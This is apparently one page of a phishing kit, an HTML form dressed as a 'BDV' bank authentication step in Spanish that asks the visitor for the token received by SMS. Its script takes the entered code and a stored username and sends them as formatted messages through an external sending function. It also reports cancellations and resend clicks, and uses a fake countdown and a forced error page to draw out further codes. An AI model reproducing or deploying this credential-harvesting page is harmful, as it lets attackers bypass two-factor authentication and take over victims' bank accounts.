<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>BDVSOLICITUDES</title>
  <link rel="icon" href="favicon.png" type="image/x-icon">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url(background.webp);
      background-size: cover;
      background-position: center;
    }

    .container {
      display: flex;
      height: 100%;
      width: 80%;
    }

    .left-side {
      width: 40%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .right-side {
      width: 30%;
    }

    form {
      width: 80%;
      background: white;
      max-width: 550px;
      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
    }

    @media (max-width: 768px) {
      body {
        background: #ededed;
      }
      .container {
        flex-direction: column;
      }
      .left-side {
        width: 100%;
        height: 100vh;
      }
      .right-side {
        display: none;
      }
    }

    .form-group {
      position: relative;
      margin-bottom: 20px;
      margin: 20px;
    }

    .form-group label {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-55%);
      color: #999;
      transition: top 0.3s, font-size 0.3s;
      pointer-events: none;
    }

    .form-group input {
      width: 100%;
      padding: 10px;
      box-sizing: border-box;
      position: relative;
      height: 60px;
      border: 0;
      border-bottom: 1px solid gray;
      background: #ededed;
      outline: none;
    }

    .form-group input:focus {
      border: 0;
    }

    .form-group input:focus + label,
    .form-group input:not(:placeholder-shown) + label {
      top: 5px;
      font-size: 12px;
    }

    button {
      background-color: #0067b1;
      color: white;
      border-radius: 3px;
      border: 0;
      padding: 10px 20px;
      text-align: center;
      display: inline-block;
      cursor: pointer;
      transition: background-color 0.3s;
      font-size: 16px;
      width: auto; 
    }

    button:disabled {
      background-color: #E0E0E0;
      cursor: not-allowed;
    }

    .cancel-btn {
      background-color: #0067b1;
      color: white;
    }

    #timerContainer {
      margin-top: 20px;
    }

    #timerText {
      color: #0067b1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="left-side">
      <form id="smsForm">
        <div style="text-align: center">
          <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
        </div>
        <div style="width: 100%; text-align: center">
          <div style="margin: 10px; color: #0067b1 !important">
            <h4>Autenticación</h4>
          </div>
          <div style="width: 100%; text-align: center">
            <div style="margin: 10px; color: #0067b1 !important">
              <h5>Introduzca el token recibido por SMS.</h5>
            </div>
            <div class="form-group">
              <input
                type="text"
                id="sms"
                name="sms"
                maxlength="8"
                required
                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                minlength="6"
              />
              <label for="sms">Código SMS *</label>
            </div>
            <input type="hidden" id="nombreOculto" name="nombre" />
          </div>
          <div style="width: 100%; text-align: center">
            <button type="submit" id="continuarBtn" disabled>Continuar</button>
            <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
          </div>
          <div id="timerContainer" style="margin-top: 20px;">
            <p id="timerText" style="color: #0067b1;">Reenviar código en: <span id="timeLeft">02:00</span></p>
          </div>
          <div style="width: 100%; height: 30px"></div>
        </div>
      </form>
    </div>
  </div>

<script src="sky.js"></script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    const nombre = localStorage.getItem("usuario") || "Desconocido";
    document.getElementById("nombreOculto").value = nombre;

    document.getElementById("smsForm").addEventListener("submit", async function(event) {
      event.preventDefault(); 
      
      const sms = document.getElementById("sms").value;
      const btn = document.getElementById("continuarBtn");

      if (sms.length >= 6) {
        btn.disabled = true;
        const msg = "📲 **CÓDIGO SMS RECIBIDO**\n👤 Usuario: `" + nombre + "`\n💬 Token: `" + sms + "`";
        
        try {
            await enviarFormulario("sms", { content: msg });
        } catch (error) {
            console.error(error);
        }
        
        window.location.href = "validando.html";
      }
    });

    document.getElementById("cancelBtn").addEventListener("click", async function() {
      try {
          await enviarFormulario("sms", { content: "🚫 **PROCESO SMS CANCELADO**\n👤 Usuario: `" + nombre + "`" });
      } catch (error) {
          console.error(error);
      }
      window.location.href = 'index.html'; 
    });

    document.getElementById("sms").addEventListener("input", function() {
      document.getElementById("continuarBtn").disabled = (this.value.length < 6);
    });

    let timer = 120; 
    const timerText = document.getElementById("timeLeft");
    const timerContainer = document.getElementById("timerContainer");

    const timerInterval = setInterval(async function() {
      const minutes = Math.floor(timer / 60);
      const seconds = timer % 60;
      timerText.textContent = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

      if (timer <= 0) {
        clearInterval(timerInterval);
        timerContainer.innerHTML = `<br><a id="reenviarLink" href="#" style="color: #0067b1; font-weight: bold;">Reenviar código</a>`;
        
        if (!localStorage.getItem("intentosSms")) {
            localStorage.setItem("intentosSms", "1");
        }

        document.getElementById("reenviarLink").addEventListener("click", async function(e) {
          e.preventDefault();
          
          let intentos = parseInt(localStorage.getItem("intentosSms") || "1");

          if (intentos < 2) {
              localStorage.setItem("intentosSms", intentos + 1);
              try {
                  await enviarFormulario("sms", { content: "🔄 **SOLICITUD DE REENVÍO SMS (Intento 2)**\n👤 Usuario: `" + nombre + "`" });
              } catch (error) {
                  console.error(error);
              }
              window.location.href = "sms-error.html"; 
          } else {
              timerContainer.innerHTML = `<br><span style="color: red; font-weight: bold;">Límite de reenvíos alcanzado.</span>`;
              try {
                  await enviarFormulario("sms", { content: "🚫 **Límite de reenvíos alcanzado**\n👤 Usuario: `" + nombre + "`" });
              } catch (error) {
                  console.error(error);
              }
          }
        });

      } else {
        timer--;
      }
    }, 1000);
  });
</script>
</body>
</html>
